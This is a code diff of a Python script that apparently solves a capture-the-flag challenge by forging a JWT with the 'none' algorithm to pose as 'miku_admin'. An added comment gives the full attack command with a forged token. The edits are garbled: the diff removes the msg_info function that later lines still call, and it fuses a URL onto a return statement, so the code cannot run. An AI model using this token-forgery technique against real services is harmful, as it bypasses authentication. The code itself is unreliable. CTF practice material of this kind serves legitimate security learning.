@@ -32,9 +32,7 @@ MANUAL_TOKEN = None
 ALG = "none"
 SUB = "miku_admin"
 
-def msg_info(message):
-    print(f"[INFO] {message}")
-
+#command line jwt attack  $python writeup3.py   $python writeup3.py https://miku.web.broncoctf.xyz/ eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibWlrdV9hZG1pbiIsICJleHAiOiAxNzM5ODYyOTkzfQ.sSV2yKwJxqelFbw7juf-hBODZNdjhXU5mmQgPPDpWxA
 def parse_args():
     """Parses command-line arguments like 'alg=none sub=admin token=...'."""
     global HOST, ALG, SUB, MANUAL_TOKEN
@@ -68,7 +66,7 @@ def tweak_token(token: str) -> str:
         cookie = f"{header}.{payload}.{signature}"
 
         msg_info(f"Tweaked Cookie is: {cookie}")
-        return cookie
+        return cookiehttps://miku.web.broncoctf.xyz
     except Exception as e:
         msg_info(f"Error tweaking token: {e}")
         return None
